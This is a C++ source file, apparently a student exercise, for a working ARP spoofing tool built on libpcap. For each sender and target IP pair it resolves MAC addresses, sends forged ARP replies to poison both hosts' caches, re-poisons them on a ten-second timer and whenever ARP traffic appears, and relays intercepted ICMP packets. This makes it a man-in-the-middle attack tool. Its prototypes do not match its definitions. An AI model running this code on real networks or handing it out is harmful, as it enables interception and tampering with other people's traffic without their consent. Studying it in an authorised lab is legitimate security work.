#include <cstdio>
#include <pcap.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <pthread.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "iphdr.h"

pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
uint8_t my_mac[6];

/* ptorotypes */
int GetMacAddr(const char* interface, uint8_t* my_mac);
int infection(pcap_t* handle, uint32_t sender_ip, uint32_t receiver_ip, Mac* sender_mac);
void relay(pcap_t* handle, uint32_t sender_ip, uint32_t receiver_ip, Mac sender_mac, Mac receiver_mac);
void infection_routine(void* thread_arg);
void spoof_routine(void* thread_arg);

void debug(int a)
{
	printf("%dth point\n", a);
}

#pragma pack(push, 1)
struct EthArpPacket final 
{
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

#pragma pack(push, 1)
struct EthIpPacket final 
{
	EthHdr eth_;
	IpHdr ip_;
};
#pragma pack(pop)

struct threadarg
{
	pcap_t* handle;
	Ip sender_ip;
	Ip receiver_ip;
	Mac sender_mac;
	Mac receiver_mac;
};

void usage() 
{
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int GetMacAddr(const char* interface, uint8_t* my_mac)
{
	struct ifreq ifr;
	int sockfd, ret;

	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if(sockfd < 0){
		printf("socket() FAILED\n");
		return -1;
	}

	strncpy(ifr.ifr_name, interface, IFNAMSIZ);
	ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
	if(ret < 0){
		printf("ioctl() FAILED\n");
		close(sockfd);
		return -1;
	}
	memcpy(my_mac, ifr.ifr_hwaddr.sa_data, 6); // mac addr len
	close(sockfd);

	return 0;
}

int reply(pcap_t* handle, Ip sender_ip, Ip receiver_ip, Mac sender_mac)
{
	EthArpPacket packet;

	/* Send ARP infection packet */
	packet.eth_.dmac_ = sender_mac; // sender mac
	packet.eth_.smac_ = Mac(my_mac); // my mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply); // reply
	packet.arp_.smac_ = Mac(my_mac);  // my mac
	packet.arp_.sip_ = htonl(receiver_ip); // receiver ip
	packet.arp_.tmac_ = sender_mac; // sender mac
	packet.arp_.tip_ = htonl(sender_ip); // sender ip

	pthread_mutex_lock(&mutex);
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	pthread_mutex_unlock(&mutex);
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	return 0;
}

int infection(pcap_t* handle, Ip sender_ip, Ip receiver_ip, Mac* sender_mac)
{

	EthArpPacket packet;

	/* broadcast to get mac addr */
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = Mac(my_mac); // my mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request); // request
	packet.arp_.smac_ = Mac(my_mac); // my mac
	packet.arp_.sip_ = htonl(Ip("0.0.0.0")); // my ip ?
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(sender_ip); // sender ip

	pthread_mutex_lock(&mutex);
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	pthread_mutex_unlock(&mutex);
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}	

	/* get sender packet */
	struct pcap_pkthdr* header;
	const u_char* rcvpacket;
	PEthHdr ethernet_hdr;
	PArpHdr arp_hdr;
	while(true){ 
		int res = pcap_next_ex(handle, &header, &rcvpacket);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		/* Get eth header */
		ethernet_hdr = (PEthHdr)rcvpacket;
		uint16_t eth_type = ethernet_hdr->type();
		if(eth_type == EthHdr::Arp){ // check if arp 
			/* Get ARP header */
			arp_hdr = (PArpHdr)(rcvpacket + sizeof(struct EthHdr));
			if(arp_hdr->sip()==sender_ip) break; // check sender ip
		}
	}
	*sender_mac = arp_hdr->smac();

	reply(handle, sender_ip, receiver_ip, *sender_mac);

	return 0;
}

void relay(pcap_t* handle, Ip sender_ip, Ip receiver_ip, Mac sender_mac, Mac receiver_mac)
{
	struct pcap_pkthdr* header;
	const u_char* rcvpacket;
	PEthHdr ethernet_hdr;
	PIpHdr ip_hdr;
	PArpHdr arp_hdr;
	int res;

	while(true){ 
		res = pcap_next_ex(handle, &header, &rcvpacket);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		
		/* Get eth header */
		ethernet_hdr = (PEthHdr)rcvpacket;
		uint16_t eth_type = ethernet_hdr->type();


		/* Ip */
		if(eth_type == EthHdr::Ip4){ // if ipv4

			/* Get Ip header */
			ip_hdr = (PIpHdr)(rcvpacket + sizeof(struct EthHdr));

			// check this thread`s packet
			if (ip_hdr->dip() != sender_ip && ip_hdr->sip() != sender_ip) continue;

			if(ip_hdr->proto == 1){ // check if icmp
				int size = sizeof(EthHdr) + ntohs(ip_hdr->total_len);
	
				// modify src mac -> my mac 
				ethernet_hdr->smac_ = Mac(my_mac);
				
				// modify dmac -> original destination
				if(ip_hdr->dip() == sender_ip) ethernet_hdr->dmac_ = sender_mac;
				else if(ip_hdr->dip() == receiver_ip) ethernet_hdr->dmac_ = receiver_mac;

				// relay
				pthread_mutex_lock(&mutex);
				res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(rcvpacket), size);
				pthread_mutex_unlock(&mutex);
				if (res != 0) {
					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
				}			
			}
		}
		
		/* Arp */
		else if(eth_type == EthHdr::Arp){ // if arp
			/* Get ARP header */
			arp_hdr = (PArpHdr)(rcvpacket + sizeof(struct EthHdr));

			// check this thread`s packet
			if (ethernet_hdr->dmac() != sender_mac && ethernet_hdr->smac() != sender_mac) continue;

			// sender re-infection 
			if((ethernet_hdr->dmac() == Mac("ff:ff:ff:ff:ff:ff") && arp_hdr->sip() == Ip(sender_ip)) || \
				(ethernet_hdr->dmac() == Mac(my_mac) && arp_hdr->sip() == sender_ip)) {
				debug(1);
				reply(handle, sender_ip, receiver_ip, sender_mac);
			}	
			// receiver re-infection
			else if ((ethernet_hdr->dmac() == Mac("ff:ff:ff:ff:ff:ff") && arp_hdr->sip() == Ip(receiver_ip)) ||\
				(ethernet_hdr->dmac() == Mac(my_mac) && arp_hdr->sip() == receiver_ip)) {
				debug(2);
				reply(handle, receiver_ip, sender_ip, receiver_mac);
			}
		}
	}
}

void infection_routine(void* thread_arg)
{
	threadarg* arg = (threadarg*)thread_arg;

	while(true) {
		sleep(10); // 10 sec sleep
		debug(3);
		reply(arg->handle, arg->sender_ip, arg->receiver_ip, arg->sender_mac);
		reply(arg->handle, arg->receiver_ip, arg->sender_ip, arg->receiver_mac);
	}
}

void spoof_routine(void* thread_arg) 
{	
	threadarg* arg = (threadarg*)thread_arg;

	/* sender & receiver infection */
	infection(arg->handle, arg->receiver_ip, arg->sender_ip, &arg->receiver_mac);
	infection(arg->handle, arg->sender_ip, arg->receiver_ip, &arg->sender_mac);
	

	/* periodic re-infection */
	pthread_t thread_t;
	if (pthread_create(&thread_t, NULL, (void* (*)(void*))infection_routine, (void*)thread_arg)) {
    	perror("thread create error:");
    	exit(0);
	}

	/* packet relay */
	relay(arg->handle, arg->sender_ip, arg->receiver_ip, arg->sender_mac, arg->receiver_mac);

	/* thread join */
	if(pthread_join(thread_t, 0)){
		perror("thread join error:");
    	exit(0);
	}
}

int main(int argc, char* argv[]) 
{
	/* check argc */
	if (argc < 4 || (argc % 2) != 0) {
		usage();
		return -1;
	}

	/* interface name */
	char* dev = argv[1];

	/* get mac addr (Attacker) */
	GetMacAddr(dev, my_mac);

	unsigned int count = argc / 2 - 1;
	pthread_t thread_t[count];
	threadarg thread_arg[count];
	pcap_t* handle[count];
	char errbuf[count][PCAP_ERRBUF_SIZE];

	// make threads
	for(int i = 0; i < count; i++){

		handle[i] = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf[i]);
		if (handle[i] == nullptr) {
			fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf[i]);
			return -1;
		}
		/* set args */
		thread_arg[i].handle = handle[i];
		thread_arg[i].sender_ip = Ip((const char*)argv[2 * (i + 1)]);
		thread_arg[i].receiver_ip = Ip((const char*)argv[2 * (i + 1) + 1]);

		if (pthread_create(&thread_t[i], NULL, (void* (*)(void*))spoof_routine, (void*)&thread_arg[i])) {
    		perror("thread create error:");
    		exit(0);
		}

	}

	// join threads
	for (int i = 0; i < count; i++){
		if(pthread_join(thread_t[i], 0)){
			perror("thread join error:");
    		exit(0);
		}
	}

	// return handles
	for (int i = 0; i < count; i++) pcap_close(handle[i]);
	// mutex destroy
	pthread_mutex_destroy(&mutex);
}